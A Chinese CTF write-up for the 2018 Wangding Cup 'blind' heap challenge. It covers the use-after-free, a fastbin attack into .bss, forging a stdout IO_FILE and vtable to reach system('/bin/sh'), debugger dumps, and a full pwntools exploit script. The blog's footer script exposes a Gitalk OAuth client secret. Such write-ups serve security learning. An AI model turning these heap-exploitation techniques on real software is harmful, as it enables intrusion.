<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">new</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0xF</span>uLL);</span><br><span class="line">  v1 = atoi(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">5</span> &amp;&amp; !ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr[v1] = <span class="built_in">malloc</span>(<span class="number">0x68</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Content:"</span>, &amp;s);</span><br><span class="line">    read_str((__int64)ptr[v1], <span class="number">0x68</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只能分配6个0x70大小的chunk且没有溢出</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0xF</span>uLL);</span><br><span class="line">  v1 = atoi(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">5</span> &amp;&amp; ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Content:"</span>, &amp;s);</span><br><span class="line">    read_str((__int64)ptr[v1], <span class="number">0x68</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没有溢出</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index:"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0xF</span>uLL);</span><br><span class="line">  v1 = atoi(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">5</span> &amp;&amp; ptr[v1] &amp;&amp; dword_602098 &lt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptr[v1]);                              <span class="comment">// uaf</span></span><br><span class="line">    ++dword_602098;                             <span class="comment">// free 3次</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>和babyheap一样可以fastbin attack，但是这个在bss段上存在0x7f可以直接在bss段上分配chunk</p>
<p>但是这题没有show等函数来leak，一个思路是修改IO_FILE结构体中的指针实现leak</p>
<p>但是这题存在system(“/bin/sh”)可以直接利用</p>
<p>我们可以伪造一个vtable</p>
<p>通过在bss段上分配chunk达到任意地址写的目的 修改0x602020的stdout指针为我们伪造的IO_FILE结构体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">p _IO_2_1_stdout_ </span><br><span class="line">$6 &#x3D; &#123;</span><br><span class="line">  file &#x3D; &#123;</span><br><span class="line">    _flags &#x3D; -72537977, </span><br><span class="line">    _IO_read_ptr &#x3D; 0x7f488d7a46a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_end &#x3D; 0x7f488d7a46a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_read_base &#x3D; 0x7f488d7a46a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_base &#x3D; 0x7f488d7a46a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_ptr &#x3D; 0x7f488d7a46a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_end &#x3D; 0x7f488d7a46a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_base &#x3D; 0x7f488d7a46a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_end &#x3D; 0x7f488d7a46a4 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;, </span><br><span class="line">    _IO_save_base &#x3D; 0x0, </span><br><span class="line">    _IO_backup_base &#x3D; 0x0, </span><br><span class="line">    _IO_save_end &#x3D; 0x0, </span><br><span class="line">    _markers &#x3D; 0x0, </span><br><span class="line">    _chain &#x3D; 0x7f488d7a38e0 &lt;_IO_2_1_stdin_&gt;, </span><br><span class="line">    _fileno &#x3D; 1, </span><br><span class="line">    _flags2 &#x3D; 0, </span><br><span class="line">    _old_offset &#x3D; -1, </span><br><span class="line">    _cur_column &#x3D; 0, </span><br><span class="line">    _vtable_offset &#x3D; 0 &#39;\000&#39;, </span><br><span class="line">    _shortbuf &#x3D; &quot;\n&quot;, </span><br><span class="line">    _lock &#x3D; 0x7f488d7a5780 &lt;_IO_stdfile_1_lock&gt;, </span><br><span class="line">    _offset &#x3D; -1, </span><br><span class="line">    _codecvt &#x3D; 0x0, </span><br><span class="line">    _wide_data &#x3D; 0x7f488d7a37a0 &lt;_IO_wide_data_1&gt;, </span><br><span class="line">    _freeres_list &#x3D; 0x0, </span><br><span class="line">    _freeres_buf &#x3D; 0x0, </span><br><span class="line">    __pad5 &#x3D; 0, </span><br><span class="line">    _mode &#x3D; -1, </span><br><span class="line">    _unused2 &#x3D; &#39;\000&#39; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable &#x3D; 0x7f488d7a26e0 &lt;_IO_file_jumps&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x&#x2F;10gx 0x00007f488d7a26e0</span><br><span class="line">0x7f488d7a26e0 &lt;_IO_file_jumps&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f488d7a26f0 &lt;_IO_file_jumps+16&gt;:	0x00007f488d4589c0	0x00007f488d459730</span><br><span class="line">0x7f488d7a2700 &lt;_IO_file_jumps+32&gt;:	0x00007f488d4594a0	0x00007f488d45a600</span><br><span class="line">0x7f488d7a2710 &lt;_IO_file_jumps+48&gt;:	0x00007f488d45b980	0x00007f488d4581e0</span><br><span class="line">0x7f488d7a2720 &lt;_IO_file_jumps+64&gt;:	0x00007f488d457ec0	0x00007f488d4574c0</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10xi 0x00007f488d4581e0</span><br><span class="line">   0x7f488d4581e0 &lt;_IO_new_file_xsputn&gt;:	xor    eax,eax</span><br><span class="line">   0x7f488d4581e2 &lt;_IO_new_file_xsputn+2&gt;:	test   rdx,rdx</span><br><span class="line">   0x7f488d4581e5 &lt;_IO_new_file_xsputn+5&gt;:	je     0x7f488d45826f &lt;_IO_new_file_xsputn+143&gt;</span><br><span class="line">   0x7f488d4581eb &lt;_IO_new_file_xsputn+11&gt;:	push   r15</span><br><span class="line">   0x7f488d4581ed &lt;_IO_new_file_xsputn+13&gt;:	push   r14</span><br></pre></td></tr></table></figure>

<p>这个题调试费了我老大劲，因为我想优雅的伪造一个IO_FILE，但是搞了一晚上也没找到那些需要改那些不需要改</p>
<p>索性直接按照原来的稍微修改一下填进去。等有时间再系统学习一下IO_FILE的利用</p>
<p>需要注意的是调用puts时并不会使用0x602020处我们伪造的stdout，在调用prinf时才会用到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► 0x7f779c885f13 &lt;buffered_vfprintf+179&gt;    mov    eax, dword ptr [rbx]</span><br><span class="line">  0x7f779c885f15 &lt;buffered_vfprintf+181&gt;    and    eax, 0x8000</span><br><span class="line">  0x7f779c885f1a &lt;buffered_vfprintf+186&gt;    jne    buffered_vfprintf+274 &lt;0x7f779c885f72&gt;</span><br><span class="line"></span><br><span class="line">  RBX  0x6020a0 ◂— 0xfbad2887</span><br></pre></td></tr></table></figure>

<p>程序在此处如果不跳转则进入__lll_lock_wait_private，所以设置flags=0x8000</p>
<p>但是修改之后的调试发现不会进入buffered_vfprintf</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (UNBUFFERED_P (s))</span><br><span class="line">    <span class="comment">/* Use a helper function which will allocate a local temporary buffer</span></span><br><span class="line"><span class="comment">       for the stream and then call us again.  */</span></span><br><span class="line">    <span class="keyword">return</span> buffered_vfprintf (s, format, ap);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNBUFFERED_P(S) ((S)-&gt;_IO_file_flags &amp; _IO_UNBUFFERED)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_UNBUFFERED 2</span></span><br></pre></td></tr></table></figure>

<p>在vfprintf中还有很有对flags的验证 0x8000都可以bypass</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function _IO_vfprintf_internal:</span><br><span class="line">   0x00007f6be7020221 &lt;+177&gt;:	mov    rax,QWORD PTR [rbx+0xd8]</span><br><span class="line">   0x00007f6be7020228 &lt;+184&gt;:	mov    rcx,r15</span><br><span class="line">   0x00007f6be702022b &lt;+187&gt;:	mov    rsi,r12</span><br><span class="line">   0x00007f6be702022e &lt;+190&gt;:	sub    rcx,r12</span><br><span class="line">   0x00007f6be7020231 &lt;+193&gt;:	mov    rdi,rbx</span><br><span class="line">   0x00007f6be7020234 &lt;+196&gt;:	mov    rdx,rcx</span><br><span class="line">   0x00007f6be7020237 &lt;+199&gt;:	mov    QWORD PTR [rbp-0x4b0],rcx</span><br><span class="line">&#x3D;&gt; 0x00007f6be702023e &lt;+206&gt;:	call   QWORD PTR [rax+0x38]</span><br></pre></td></tr></table></figure>

<p>还有一种思路是在bss上伪造一个unsorted bin 将其释放后并修改fd的低8位为\x00 就可以在malloc_hook上写了</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn_debug <span class="keyword">import</span> *</span><br><span class="line">pdbg = pwn_debug(<span class="string">"blind"</span>)</span><br><span class="line">pdbg.local()</span><br><span class="line">p = pdbg.run(<span class="string">"local"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>,str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">'Content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Choice:'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>,str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">'Content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Choice:'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">new(<span class="number">1</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">new(<span class="number">2</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">new(<span class="number">0</span>,<span class="string">'cccc'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)<span class="comment">#2------1-----x</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x60203d</span>))</span><br><span class="line">new(<span class="number">3</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">new(<span class="number">4</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">new(<span class="number">5</span>,<span class="string">'dddd'</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x6020a0</span>)+p64(<span class="number">0x6020a0</span>+<span class="number">0x68</span>)+p64(<span class="number">0x6020a0</span>+<span class="number">0x68</span>*<span class="number">2</span>)+p64(<span class="number">0x6020a0</span>+<span class="number">0x68</span>*<span class="number">3</span>)+p64(<span class="number">0x602020</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x8000</span>)+p64(<span class="number">0x602020</span>)*<span class="number">7</span>+p64(<span class="number">0x602021</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x602020</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0xffffffffffffffff</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x602020</span>)+p64(<span class="number">0xffffffffffffffff</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x602020</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x00000000ffffffff</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x6020a0</span>+<span class="number">0x68</span>*<span class="number">3</span>))</span><br><span class="line">g()</span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0x4008E3</span>)*<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0x6020a0</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="https://www.lyyl.online/2018/09/14/2018-9-14-%E7%BD%91%E9%BC%8E%E6%9D%AF-blind/" target="_blank" rel="noopener">https://www.lyyl.online/2018/09/14/2018-9-14-%E7%BD%91%E9%BC%8E%E6%9D%AF-blind/</a></p>
<p><a href="http://p4nda.top/2018/08/27/WDBCTF-2018/" target="_blank" rel="noopener">http://p4nda.top/2018/08/27/WDBCTF-2018/</a></p>

<div id="gitalk-container"></div>
<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

		<script>
		var gitalkConfig = {"clientID":"787cc455593c1fb9cfcd","clientSecret":"f6abba3d9cc77878426ee16aa8bcb980fd3cd70c","repo":"s1vona.github.io","owner":"s1vona","admin":["s1vona"],"distractionFreeMode":true};
	    gitalkConfig.id = md5(location.pathname);
		var gitalk = new Gitalk(gitalkConfig);
	    gitalk.render("gitalk-container");
	    </script>
        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Sivona</span>
                    </p>
                
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/wdb/"># wdb</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2020/05/11/2020%E7%BD%91%E9%BC%8E%E6%9D%AF/">2020网鼎杯</a>
            
            
            <a class="next" rel="next" href="/2020/03/30/tiny%20trick/">猥琐</a>
            
        </section>


    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Sivona | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
    <div>
        友情链接: 
       <div>
        <a class="theme-link"  href="https://sncker.github.io" target="_blank" rel="noopener"> SNCKER's blog </a><span>&nbsp;&nbsp;</span>
        <a class="theme-link"  href="https://blog.csdn.net/qq_43531895" target="_blank" rel="noopener"> EnJoy_July 's blog' </a><span>&nbsp;&nbsp;</span>
       </div>
       
      </div>
</footer>

    </div>
</body>
</html>
